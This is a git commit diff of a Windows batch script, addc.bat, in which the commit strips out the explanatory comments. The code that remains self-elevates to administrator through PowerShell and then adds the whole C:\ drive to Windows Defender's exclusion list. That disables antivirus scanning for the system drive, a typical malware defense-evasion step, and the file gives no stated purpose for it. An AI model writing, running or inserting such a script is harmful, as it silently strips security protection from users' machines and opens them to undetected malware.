711094deb2e2ff8ded958e047eb7bf45a0db09ef
hjbkjgvijkkhgk <131483909+UnlimitedGPT@users.noreply.github.com>
2024-12-12 22:22:35 +0100

    Update addc.bat

--- addc.bat
+++ addc.bat
@@ -1,6 +1,3 @@
 @echo off
-:: Check for admin privileges
 net session >nul 2>&1 || (powershell -Command "Start-Process '%~f0' -Verb RunAs" & exit)
-
-:: Add 'C' to Windows Defender Exclusions
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
